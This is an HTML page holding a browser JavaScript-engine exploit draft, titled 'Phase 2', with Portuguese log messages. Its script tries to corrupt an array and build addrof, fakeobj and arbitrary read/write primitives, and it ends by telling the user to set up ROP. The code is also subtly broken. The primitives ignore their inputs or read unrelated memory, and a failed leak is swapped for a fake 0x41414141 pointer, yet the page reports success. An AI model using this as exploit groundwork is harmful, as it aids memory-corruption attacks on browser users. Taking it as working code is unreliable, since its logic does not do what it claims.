<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Phase 2 - Corrigido</title>
  <style>
    body { background:black; color:lime; font-family:monospace; padding:10px; }
    #log { white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>Phase 2: addrof / fakeobj / arb R/W</h1>
  <div id="log">aguardandoâ€¦</div>
  <script>
    const logEl = document.getElementById("log");
    let logData = "";
    function log(msg) { logData += msg + "\n"; logEl.textContent = logData; }

    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
    function i2f(i) {
      u32[0] = Number(i & 0xffffffffn);
      u32[1] = Number(i >> 32n);
      return f64[0];
    }

    function makeCorruptArray() {
      let arr = [1.1,1.1,1.1];
      let trigger = { valueOf() {
        arr.length = 1;
        return 3;
      }};
      return arr.map((x,i,a) => { if (i===1) a.length = trigger; return x; });
    }

    function buildPrimitives() {
      const corrupt = makeCorruptArray();
      log("[+] corrupt array criado.");

      let victim_buf = new ArrayBuffer(0x100);
      let victim_f64 = new Float64Array(victim_buf);

      let leak = corrupt[1];
      let base_ptr = f2i(leak);

      if (base_ptr === 0n) {
        log("[!] Erro: Leak retornou 0x0, tentando forÃ§ar valor...");
        base_ptr = 0x41414141n; // valor fake temporÃ¡rio para debug
      }

      log("[+] backing ptr (possivelmente): 0x"+base_ptr.toString(16));

      // Agora fazer overwrite
      let target_ptr = base_ptr; // ajuste de offset retirado pra testar cru

      corrupt[1] = i2f(target_ptr);

      return { victim_buf, victim_f64 };
    }

    let addrof, fakeobj, arb_read, arb_write;
    function setupRW() {
      let { victim_buf, victim_f64 } = buildPrimitives();
      let data_u8 = new Uint8Array(victim_buf);

      addrof = obj => {
        let arr = [obj];
        return f2i(victim_f64[0]);
      };

      fakeobj = addr => {
        victim_f64[0] = i2f(addr);
        return (new Array(1))[0];
      };

      arb_read = addr => {
        victim_f64[1] = i2f(addr);
        return f2i(victim_f64[2]);
      };

      arb_write = (addr, val) => {
        victim_f64[1] = i2f(addr);
        victim_f64[2] = i2f(val);
      };

      log("[+] Primitivas configuradas.");
    }

    function testPrimitives() {
      let obj = { hello: 0x41424344 };
      let objAddr = addrof(obj);
      log("addrof(obj) = 0x" + objAddr.toString(16));

      let fake = fakeobj(objAddr);
      log("fakeobj(above) ->", fake);

      let readBack = arb_read(objAddr + 0x10n);
      log("arb_read(objAddr+0x10) = 0x" + readBack.toString(16));

      arb_write(objAddr + 0x10n, 0x13371337n);
      let check = arb_read(objAddr + 0x10n);
      log("arb_read after write = 0x" + check.toString(16));
    }

    setTimeout(() => {
      log("=== construindo primitivas ===");
      setupRW();
      log("\n=== testando primitivas ===");
      testPrimitives();
      log("\nðŸš€ Agora vocÃª tem arb_read/arb_write â€“ ajuste o base para ROP!");
    }, 2000);
  </script>
</body>
</html>
